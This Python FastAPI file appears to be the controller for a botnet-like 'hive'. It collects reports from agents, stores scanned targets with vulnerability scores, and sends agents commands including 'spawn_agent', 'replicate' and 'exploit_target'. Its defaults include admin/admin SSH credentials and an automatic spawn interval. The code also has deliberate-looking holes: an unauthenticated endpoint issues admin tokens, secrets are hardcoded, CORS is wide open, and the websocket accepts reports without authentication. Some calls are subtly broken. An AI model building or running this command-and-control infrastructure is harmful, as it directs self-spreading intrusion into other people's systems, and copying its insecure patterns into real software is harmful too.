# server.py - Throng Hive Dashboard (Final Version - Fixed JWT)

from fastapi import FastAPI, WebSocket, HTTPException, Depends, Request
from fastapi.responses import HTMLResponse
from fastapi.templating import Jinja2Templates
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware
import sqlite3
import json
import time
import os
from pydantic import BaseModel
import paho.mqtt.client as mqtt
from paho.mqtt.client import CallbackAPIVersion
import jwt  # ✅ Berhasil karena python-jose[cryptography] terinstall
from sklearn.ensemble import IsolationForest
import numpy as np
import paramiko
import requests
import uuid
import threading
import logging
import socket

# ============ SETUP ============
app = FastAPI()

# Middleware
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Static & Templates
app.mount("/static", StaticFiles(directory="static"), name="static")
templates = Jinja2Templates(directory="templates")
security = HTTPBearer()

# Logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ============ CONFIG ============
JWT_SECRET = os.getenv("JWT_SECRET", "throng_default_secret_1234567890")
JWT_ALGORITHM = "HS256"
MQTT_BROKER = os.getenv("MQTT_BROKER", "5374fec8494a4a24add8bb27fe4ddae5.s1.eu.hivemq.cloud:8883")
MQTT_USERNAME = os.getenv("MQTT_USERNAME", "throng_user")
MQTT_PASSWORD = os.getenv("MQTT_PASSWORD", "ThrongPass123!")
RAILWAY_API_TOKEN = os.getenv("RAILWAY_API_TOKEN", "")
PROJECT_ID = os.getenv("RAILWAY_PROJECT_ID", "")
DEFAULT_SPAWN_TARGET = os.getenv("DEFAULT_SPAWN_TARGET", "192.168.1.10")
DEFAULT_SSH_USERNAME = os.getenv("DEFAULT_SSH_USERNAME", "admin")
DEFAULT_SSH_PASSWORD = os.getenv("DEFAULT_SSH_PASSWORD", "admin")
AUTO_SPAWN_INTERVAL = int(os.getenv("AUTO_SPAWN_INTERVAL", "300"))
GITHUB_REPO = os.getenv("GITHUB_REPO", "username/throng")

# ============ MODEL PERINTAH ============
class Command(BaseModel):
    agent_id: str
    action: str
    target: str = None
    params: dict = {}
    emergency: bool = False

# ============ DATABASE ============
db_connection = sqlite3.connect("throng.db", check_same_thread=False)
db_cursor = db_connection.cursor()

def init_db():
    db_cursor.execute('''CREATE TABLE IF NOT EXISTS reports 
                 (id INTEGER PRIMARY KEY, agent_id TEXT, data TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    db_cursor.execute('''CREATE TABLE IF NOT EXISTS counterattacks 
                 (id INTEGER PRIMARY KEY, agent_id TEXT, target TEXT, action TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    db_cursor.execute('''CREATE TABLE IF NOT EXISTS agents 
                 (id INTEGER PRIMARY KEY, agent_id TEXT, status TEXT, last_seen DATETIME, ip TEXT, host TEXT)''')
    db_cursor.execute('''CREATE TABLE IF NOT EXISTS targets 
                 (id INTEGER PRIMARY KEY, target TEXT, vulnerability TEXT, status TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP, score REAL)''')
    db_cursor.execute('''CREATE TABLE IF NOT EXISTS emergency_logs 
                 (id INTEGER PRIMARY KEY, agent_id TEXT, action TEXT, details TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    db_connection.commit()

init_db()

# ============ MQTT CLIENT ============
mqtt_client = mqtt.Client(callback_api_version=CallbackAPIVersion.VERSION2)
active_websockets = []

def on_connect(client, userdata, flags, rc, properties=None):
    logger.info(f"MQTT connected with result code {rc}")
    if rc == 0:
        client.subscribe("throng/reports")

def on_message(client, userdata, msg):
    if msg.topic == "throng/reports":
        try:
            report = json.loads(msg.payload.decode())
            for ws in active_websockets:
                ws.send_text(json.dumps({"type": "report", "data": report}))
        except Exception as e:
            logger.error(f"Error broadcasting message: {e}")

mqtt_client.on_connect = on_connect
mqtt_client.on_message = on_message
mqtt_client.tls_set()
mqtt_client.username_pw_set(MQTT_USERNAME, MQTT_PASSWORD)

# Pisah host dan port
broker_host = MQTT_BROKER.split(":")[0]
broker_port = int(MQTT_BROKER.split(":")[1])
mqtt_client.connect(broker_host, broker_port, 60)
mqtt_client.loop_start()

# ============ MODEL ANOMALI ============
anomaly_model = IsolationForest(contamination=0.1, random_state=42)

def analyze_threats(reports):
    data = [[r["data"].get("network_traffic", 0), len(r["data"].get("vulnerability", []))] for r in reports]
    if len(data) < 2:
        return []
    predictions = anomaly_model.fit_predict(np.array(data))
    return [1 if pred == -1 else 0 for pred in predictions]

# ============ VERIFIKASI TOKEN ============
async def verify_token(credentials: HTTPAuthorizationCredentials = Depends(security)):
    try:
        payload = jwt.decode(credentials.credentials, JWT_SECRET, algorithms=[JWT_ALGORITHM])
        return payload
    except jwt.PyJWTError:
        raise HTTPException(status_code=401, detail="Invalid or expired token")

# ============ ENDPOINTS ============

@app.get("/token")
async def get_token():
    payload = {"user": "admin", "exp": time.time() + 3600}
    token = jwt.encode(payload, JWT_SECRET, algorithm=JWT_ALGORITHM)
    return {"token": token}

@app.get("/api/data", dependencies=[Depends(verify_token)])
async def get_dashboard_data():
    db_cursor.execute("SELECT agent_id, status, last_seen, ip, host FROM agents WHERE status = 'active'")
    agents = [{"agent_id": r[0], "status": r[1], "last_seen": r[2], "ip": r[3], "host": r[4]} for r in db_cursor.fetchall()]

    db_cursor.execute("SELECT target, vulnerability, status, timestamp, score FROM targets")
    targets = [{"target": r[0], "vulnerability": json.loads(r[1]), "status": r[2], "timestamp": r[3], "score": r[4]} for r in db_cursor.fetchall()]

    db_cursor.execute("SELECT agent_id, data, timestamp FROM reports ORDER BY timestamp DESC LIMIT 100")
    reports = [{"agent_id": r[0], "data": json.loads(r[1]), "timestamp": r[2]} for r in db_cursor.fetchall()]

    anomalies = analyze_threats(reports)
    for i, r in enumerate(reports):
        if i < len(anomalies):
            r["data"]["is_anomaly"] = bool(anomalies[i])

    db_cursor.execute("SELECT agent_id, action, details, timestamp FROM emergency_logs ORDER BY timestamp DESC LIMIT 100")
    emergency_logs = [{"agent_id": r[0], "action": r[1], "details": json.loads(r[2]), "timestamp": r[3]} for r in db_cursor.fetchall()]

    network_data = {
        "nodes": [
            {"id": "hive", "label": "Hive", "group": "hive", "color": "#00b7eb"},
            *[{"id": a["agent_id"], "label": a["agent_id"], "group": "agent", "color": "#00ff00"} for a in agents],
            *[{"id": t["target"], "label": t["target"], "group": "target", "color": "#ff0000" if t["score"] > 0.5 else "#cccccc"} for t in targets]
        ],
        "edges": [
            *[{"from": "hive", "to": a["agent_id"]} for a in agents],
            *[{"from": a["agent_id"], "to": t["target"]} for a in agents for t in targets if t["status"] == "claimed"]
        ]
    }

    return {
        "agents": agents,
        "targets": targets,
        "reports": reports,
        "emergency_logs": emergency_logs,
        "network": network_data
    }

@app.post("/command", dependencies=[Depends(verify_token)])
async def send_command(command: Command):
    allowed = ["block_ip", "send_honeypot", "redirect_traffic", "spawn_agent", "replicate", "scan_target", "exploit_target"]
    if command.action not in allowed:
        raise HTTPException(status_code=400, detail="Invalid action")

    if command.target:
        db_cursor.execute("INSERT INTO counterattacks (agent_id, target, action) VALUES (?, ?, ?)", 
                          (command.agent_id, command.target, command.action))
        if command.emergency:
            db_cursor.execute("INSERT INTO emergency_logs (agent_id, action, details) VALUES (?, ?, ?)", 
                              (command.agent_id, command.action, json.dumps({"target": command.target, "params": command.params})))
    db_connection.commit()

    mqtt_client.publish(f"throng/commands/{command.agent_id}", json.dumps(command.dict()))
    for ws in active_websockets:
        ws.send_text(json.dumps({"type": "command", "data": command.dict()}))

    return {"status": f"Command {command.action} sent to {command.agent_id}"}

# ============ WEBSOCKET ============
@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    active_websockets.append(websocket)
    try:
        while True:
            data = await websocket.receive_text()
            report = json.loads(data)
            agent_id = report.get("agent_id")
            report_data = report.get("data")

            db_cursor.execute("INSERT INTO reports (agent_id, data) VALUES (?, ?)", (agent_id, json.dumps(report_data)))
            db_cursor.execute("INSERT OR REPLACE INTO agents (agent_id, status, last_seen, ip) VALUES (?, ?, ?, ?)", 
                              (agent_id, "active", time.strftime("%Y-%m-%d %H:%M:%S"), report_data.get("ip", "unknown")))
            if "vulnerability" in report_data:
                score = len(report_data.get("vulnerability", [])) * 0.2
                db_cursor.execute("INSERT INTO targets (target, vulnerability, status, score) VALUES (?, ?, ?, ?)", 
                                  (report_data.get("target"), json.dumps(report_data.get("vulnerability")), "scanned", score))
            db_connection.commit()
            logger.info(f"Agent {agent_id} reported. Data saved.")
    except Exception as e:
        logger.error(f"WebSocket error: {e}")
    finally:
        if websocket in active_websockets:
            active_websockets.remove(websocket)

# ============ DASHBOARD ============
@app.get("/", response_class=HTMLResponse)
async def read_root(request: Request):
    logger.info(f"Rendering dashboard.html with version {int(time.time())}")
    return templates.TemplateResponse("dashboard.html", {"request": request, "version": int(time.time())})

# ============ HEALTH CHECK ============
@app.get("/health")
async def health():
    return {"status": "ok"}

# ============ CLEANUP ============
import atexit
@atexit.register
def cleanup():
    db_connection.close()
    mqtt_client.loop_stop()
    logger.info("Server shutdown: DB and MQTT cleaned up.")